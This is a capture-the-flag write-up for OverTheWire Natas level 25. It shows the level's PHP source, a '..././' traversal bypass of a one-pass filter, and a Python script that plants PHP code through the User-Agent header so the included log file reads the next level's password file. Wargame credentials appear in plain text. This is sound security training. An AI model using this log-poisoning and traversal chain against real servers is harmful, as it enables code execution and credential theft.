# Over The Wire -- Natas 25

## Server URL
```
http://natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c@natas25.natas.labs.overthewire.org
```

## Solution
We get a text quote

The php source code is 
```php
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
<body>
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Hmmm, the fact that we can't use `../` is a pain in the ass.. Not sure how to recover the password.

Seems like we have control over what is written to log using our `USER-AGENT`. But i don't know how to access it.

Using absolute path result in `forbidden` and we can't include the `logs` folder since we need `../` to get up one folder from the `language` folder...

After some thinking, it wasn't that complicated.
The `str_replace` is only done once. We can use `..././` that will get replaced to `../` to do directory traversal.

We can include the logs using (the id is the session id)
```
?lang=..././logs/natas25_18sj9ue8fl7dqsu9ioqadflm41.log
```

So now we just need to trigger the log writing with a `user-agent` containing php code.

We use this python script to do this:
```py
import requests

url = "http://natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c@natas25.natas.labs.overthewire.org"

php_payload = "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>"
    
s = requests.Session()
r = s.get(url)
session_id = list(r.cookies.get_dict().values())[0]
r = s.get(url, headers={"User-Agent":php_payload}, params={"lang": f"..././logs/natas25_{session_id}.log"})
password = r.text.split('\n "Directory')[0].split(']')[1].strip()

print(f"Natas26 password : {password}")
```

We get Natas26 password :
```
oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
```
